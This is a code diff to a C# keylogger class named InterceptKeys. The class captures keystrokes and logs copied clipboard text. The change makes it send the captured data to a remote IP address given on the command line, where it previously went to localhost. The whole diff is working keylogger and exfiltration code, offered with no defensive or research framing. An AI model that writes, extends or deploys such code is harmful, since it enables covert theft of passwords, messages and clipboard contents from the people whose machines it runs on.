@@ -58,6 +58,7 @@ class InterceptKeys
 	private static string tempClipboard;
 	private static IntPtr wParamTemp;
 	private static IntPtr lParamTemp;
+	private static string ipReceiver = string.Empty;
 	#endregion
 	public static void Main(string[] args)
 	{
@@ -70,6 +71,10 @@ class InterceptKeys
 			if(args.Length ==1 && !string.IsNullOrEmpty(args[0])) 
 			{
 				networkWorking = CheckNetwork(args[0]);
+				if (networkWorking)
+				{
+					ipReceiver = args[0];
+				}
 			}
 			SetKeyboardConfiguration();
 		}
@@ -191,13 +196,13 @@ class InterceptKeys
 
 	private static void SaveTheData()
 	{
-		var data = DataToSave();
+		var data = PopDataFromMemory();
 		if (networkWorking)
 		{
 			var bytesToSend = new byte[data.Length * sizeof(char)];
 			//Encoding.ASCII.GetBytes(data);
 			Buffer.BlockCopy(data, 0, bytesToSend, 0, bytesToSend.Length);
-			_sendData(bytesToSend, "127.0.0.1");
+			_sendData(bytesToSend, ipReceiver);
 		}
 		else
 		{
@@ -210,7 +215,7 @@ class InterceptKeys
 		sendingData = false;
 	}
 
-	private static char[] DataToSave()
+	private static char[] PopDataFromMemory()
 	{
 		//var pcName = $"{Environment.MachineName}-{DateTime.UtcNow}:".ToArray();
 		var maxVkLenght = maxDataLenght;// - pcName.Length - 1;
@@ -314,7 +319,6 @@ class InterceptKeys
 				if(Clipboard.ContainsText())
 				{
 					tempClipboard = Clipboard.GetText();
-					var text = GetClipboardData((uint)TextDataFormat.UnicodeText);
 					TraceLog(myfileStream, $"Copied text: {tempClipboard}", true);
 				}				
 				return;
@@ -376,8 +380,6 @@ class InterceptKeys
 		int bufferSize,
 		uint flags);
 
-	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-	private static extern IntPtr GetClipboardData(uint uFormat);
 	#endregion
 
 }
